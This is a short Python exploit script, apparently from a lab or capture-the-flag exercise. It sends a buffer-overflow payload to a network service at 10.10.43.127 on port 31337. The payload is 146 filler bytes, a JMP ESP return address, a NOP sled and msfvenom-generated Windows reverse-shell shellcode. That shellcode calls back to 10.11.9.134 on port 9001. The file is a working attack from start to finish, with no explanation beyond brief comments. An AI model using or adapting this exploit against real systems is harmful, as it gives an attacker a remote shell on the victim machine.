#!/usr/bin/python
import socket

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.9.134 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00\x0a" 
shell_code = ("\xdb\xd8\xd9\x74\x24\xf4\x5d\xbf\x01\xb3\x61\x74\x29\xc9\xb1"
"\x52\x31\x7d\x17\x03\x7d\x17\x83\xc4\xb7\x83\x81\x3a\x5f\xc1"
"\x6a\xc2\xa0\xa6\xe3\x27\x91\xe6\x90\x2c\x82\xd6\xd3\x60\x2f"
"\x9c\xb6\x90\xa4\xd0\x1e\x97\x0d\x5e\x79\x96\x8e\xf3\xb9\xb9"
"\x0c\x0e\xee\x19\x2c\xc1\xe3\x58\x69\x3c\x09\x08\x22\x4a\xbc"
"\xbc\x47\x06\x7d\x37\x1b\x86\x05\xa4\xec\xa9\x24\x7b\x66\xf0"
"\xe6\x7a\xab\x88\xae\x64\xa8\xb5\x79\x1f\x1a\x41\x78\xc9\x52"
"\xaa\xd7\x34\x5b\x59\x29\x71\x5c\x82\x5c\x8b\x9e\x3f\x67\x48"
"\xdc\x9b\xe2\x4a\x46\x6f\x54\xb6\x76\xbc\x03\x3d\x74\x09\x47"
"\x19\x99\x8c\x84\x12\xa5\x05\x2b\xf4\x2f\x5d\x08\xd0\x74\x05"
"\x31\x41\xd1\xe8\x4e\x91\xba\x55\xeb\xda\x57\x81\x86\x81\x3f"
"\x66\xab\x39\xc0\xe0\xbc\x4a\xf2\xaf\x16\xc4\xbe\x38\xb1\x13"
"\xc0\x12\x05\x8b\x3f\x9d\x76\x82\xfb\xc9\x26\xbc\x2a\x72\xad"
"\x3c\xd2\xa7\x62\x6c\x7c\x18\xc3\xdc\x3c\xc8\xab\x36\xb3\x37"
"\xcb\x39\x19\x50\x66\xc0\xca\x55\x7c\xc3\x8c\x02\x80\xd3\xb3"
"\xfb\x0d\x35\xd9\xeb\x5b\xee\x76\x95\xc1\x64\xe6\x5a\xdc\x01"
"\x28\xd0\xd3\xf6\xe7\x11\x99\xe4\x90\xd1\xd4\x56\x36\xed\xc2"
"\xfe\xd4\x7c\x89\xfe\x93\x9c\x06\xa9\xf4\x53\x5f\x3f\xe9\xca"
"\xc9\x5d\xf0\x8b\x32\xe5\x2f\x68\xbc\xe4\xa2\xd4\x9a\xf6\x7a"
"\xd4\xa6\xa2\xd2\x83\x70\x1c\x95\x7d\x33\xf6\x4f\xd1\x9d\x9e"
"\x16\x19\x1e\xd8\x16\x74\xe8\x04\xa6\x21\xad\x3b\x07\xa6\x39"
"\x44\x75\x56\xc5\x9f\x3d\x76\x24\x35\x48\x1f\xf1\xdc\xf1\x42"
"\x02\x0b\x35\x7b\x81\xb9\xc6\x78\x99\xc8\xc3\xc5\x1d\x21\xbe"
"\x56\xc8\x45\x6d\x56\xd9")

# "A" * offset + JMP ESP address in little endian
string = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 20 + shell_code

print "Fuzzing..."
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('10.10.43.127',31337))
s.send(string + '\r\n')
data = s.recv(1024)
s.close()